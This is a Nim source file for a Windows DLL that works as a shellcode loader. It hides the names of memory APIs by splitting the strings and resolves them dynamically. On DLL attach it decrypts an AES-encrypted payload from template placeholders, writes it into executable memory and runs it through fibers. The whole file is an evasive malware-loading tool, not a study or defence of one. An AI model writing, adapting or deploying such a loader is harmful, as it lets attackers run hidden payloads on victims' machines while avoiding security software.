import winim
import nimcrypto
import DLoader

func toByteSeq*(str: string): seq[byte] {.inline.} =
  ## Converts a string to the corresponding byte sequence.
  @(str.toOpenArrayByte(0, str.high))

const KERNEL32_DLL* = "kernel32.dll"

var WPM = ""
WPM.add("Wr")
WPM.add("it")
WPM.add("eP")
WPM.add("ro")
WPM.add("ce")
WPM.add("ss")
WPM.add("Me")
WPM.add("mo")
WPM.add("ry")

var VirtAl = ""
VirtAl.add("Vi")
VirtAl.add("rt")
VirtAl.add("ua")
VirtAl.add("lA")
VirtAl.add("ll")
VirtAl.add("oc")

var VirtPr = ""
VirtPr.add("Vi")
VirtPr.add("rt")
VirtPr.add("ua")
VirtPr.add("lP")
VirtPr.add("ro")
VirtPr.add("te")
VirtPr.add("ct")

type
    WriteProcessMemory_t* = proc(hProcess: HANDLE, lpBaseAddress: LPVOID, lpBuffer: LPCVOID, nSize: SIZE_T, lpNumberOfBytesWritten: ptr SIZE_T): BOOL {.stdcall.}

type
    VirtualAlloc_t* = proc(lpAddress: LPVOID, dwSize: SIZE_T, flAllocationType: DWORD, flProtect: DWORD): LPVOID {.stdcall.}

type 
    VirtualProtect_t* = proc(lpAddress: LPVOID, dwSize: SIZE_T, flNewProtect: DWORD, lpflOldProtect: PDWORD): WINBOOL {.stdcall.}

var WriteProcessMemory_p*: WriteProcessMemory_t

var VirtualAlloc_p*: VirtualAlloc_t

var VirtualProtect_p*: VirtualProtect_t
var k32Addr: HANDLE = get_library_address() 

WriteProcessMemory_p = cast[WriteProcessMemory_t](cast[LPVOID](get_function_address(cast[HMODULE](k32Addr), WPM)))
VirtualAlloc_p = cast[VirtualAlloc_t](cast[LPVOID](get_function_address(cast[HMODULE](k32Addr), VirtAl)))
VirtualProtect_p = cast[VirtualProtect_t](cast[LPVOID](get_function_address(cast[HMODULE](k32Addr), VirtPr)))

proc CreateF*(dwStackSize: SIZE_T, lpStartAddress: LPFIBER_START_ROUTINE, lpParameter: LPVOID): LPVOID {.discardable, stdcall, dynlib: "kernel32", importc: "CreateFiber".}
proc SwitchToF*(lpFiber: LPVOID): VOID {.discardable, stdcall, dynlib: "kernel32", importc: "SwitchToFiber".}
proc ConvertTToF*(lpParameter: LPVOID): LPVOID {.discardable, stdcall, dynlib: "kernel32", importc: "ConvertThreadToFiber".}

proc NimMain() {.cdecl, importc.}

proc execute(): void =
    let shellcode: seq[byte] = REPLACE_ME
    let iv = "BLANK_IV"
    let passwd = """BLANK_PASSWORD"""

    var dctx: CTR[aes256]

    var decShellcode = newSeq[byte](len(shellcode))
    let decodedIV = fromHex(iv)

    var expandedkey = sha256.digest(passwd)
    dctx.init(expandedkey.data, decodedIV)
    dctx.decrypt(shellcode, decShellcode)
    dctx.clear()

    var oldProtect: DWORD
    ConvertTToF(NULL)
    echo "ConvertToFiber called!"
    let buffer = VirtualAlloc_p(NULL, cast[SIZE_T](decShellcode.len), MEM_COMMIT, PAGE_READ_WRITE)
    echo "VirtualAlloc called!"
    var bytesWritten: SIZE_T
    let pHandle = GetCurrentProcess()
    echo "GetCurrentProcess called!"
    discard WriteProcessMemory_p(pHandle, buffer, unsafeAddr decShellcode[0], cast[SIZE_T](decShellcode.len), addr bytesWritten)
    echo "WriteProcessMemory called!"
    discard VirtualProtect_p(buffer, cast[SIZE_T](decShellcode.len), PAGE_EXECUTE, addr oldProtect)
    let xFiber = CreateF(0, cast[LPFIBER_START_ROUTINE](buffer), NULL)
    SwitchToF(xFiber)

proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL {.stdcall, exportc, dynlib.} =
  NimMain()
  
  if fdwReason == DLL_PROCESS_ATTACH:
    execute()

  return true
